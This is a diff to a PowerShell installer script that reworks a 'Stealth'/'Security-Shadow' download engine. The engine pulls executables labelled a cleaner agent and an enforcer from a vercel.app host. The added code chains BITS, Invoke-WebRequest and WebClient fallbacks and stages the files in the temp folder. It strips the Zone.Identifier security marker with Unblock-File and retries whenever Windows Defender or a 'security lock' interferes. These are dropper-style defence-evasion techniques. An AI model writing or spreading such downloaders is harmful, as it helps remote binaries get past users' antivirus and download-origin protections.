@@ -53,38 +53,55 @@ try {
 if (!$CleanerUrl) { $CleanerUrl = "https://prometheus-corp.vercel.app/prometheus-windows-x64.exe" }
 if (!$EnforcerUrl) { $EnforcerUrl = "https://prometheus-corp.vercel.app/prometheus-enforcer-windows-x64.exe" }
 
-# 6. Stealth Download Engine
+# 6. Security-Shadow Download Engine
 function Download-File {
     param([string]$Url, [string]$Dest)
     $MaxRetries = 3
     $StepCount = 0
     $Done = $false
-    $TempDest = $Dest + ".pkg"
+    
+    $Filename = [System.IO.Path]::GetFileName($Dest)
+    $StagingPath = Join-Path $env:TEMP "$Filename.pkg"
 
     while (!$Done -and $StepCount -lt $MaxRetries) {
         try {
-            if (Test-Path $TempDest) { Remove-Item -Path $TempDest -Force -ErrorAction SilentlyContinue }
-            if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
-                Start-BitsTransfer -Source $Url -Destination $TempDest -Priority High -ErrorAction Stop
-            } else {
-                (New-Object System.Net.WebClient).DownloadFile($Url, $TempDest)
-            }
+            if (Test-Path $StagingPath) { Remove-Item -Path $StagingPath -Force -ErrorAction SilentlyContinue }
             
-            if (Test-Path $TempDest) {
-                # TACTICAL DELAY: Give Windows Defender time to finish scanning
+            # --- TIERED DOWNLOAD PROTOCOL ---
+            Write-Host "   -> Attempting secure transmission (Tier $($StepCount + 1))..." -ForegroundColor Gray
+            
+            try {
+                # TIER 1: BitsTransfer
+                if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
+                    Start-BitsTransfer -Source $Url -Destination $StagingPath -Priority High -ErrorAction Stop
+                } else { throw "BITS missing" }
+            } catch {
+                try {
+                    # TIER 2: Invoke-WebRequest (Fallback)
+                    Invoke-WebRequest -Uri $Url -OutFile $StagingPath -UseBasicParsing -ErrorAction Stop
+                } catch {
+                    # TIER 3: WebClient (Legacy Fallback)
+                    (New-Object System.Net.WebClient).DownloadFile($Url, $StagingPath)
+                }
+            }
+
+            if (Test-Path $StagingPath) {
+                # TACTICAL VERIFICATION & CLEANSING
                 Start-Sleep -Seconds 2
-                Write-Host "   -> Verification successful. Unblocking..." -ForegroundColor Gray
-                Unblock-File -Path $TempDest -ErrorAction SilentlyContinue
-                Move-Item -Path $TempDest -Destination $Dest -Force
+                Write-Host "   -> Stripping Zone.Identifier (Staging-Phase)..." -ForegroundColor Gray
+                Unblock-File -Path $StagingPath -ErrorAction SilentlyContinue
+                
+                Write-Host "   -> Migrating cleaned binary to system core..." -ForegroundColor Gray
+                Move-Item -Path $StagingPath -Destination $Dest -Force
                 $Done = $true
             }
         } catch {
             $StepCount++
-            Write-Host "[WARN] System scan interference or lock detected ($StepCount/$MaxRetries)... Retrying." -ForegroundColor Yellow
+            Write-Host "[WARN] System interference detected ($StepCount/$MaxRetries). Cycling protocol..." -ForegroundColor Yellow
             Start-Sleep -Seconds 5
         }
     }
-    if (!$Done) { throw "Download Failed" }
+    if (!$Done) { throw "Download Engine Exhausted: Security Lock Persistent" }
 }
 
 Write-Host "[DATA] Downloading Cleaner agent..." -ForegroundColor Cyan
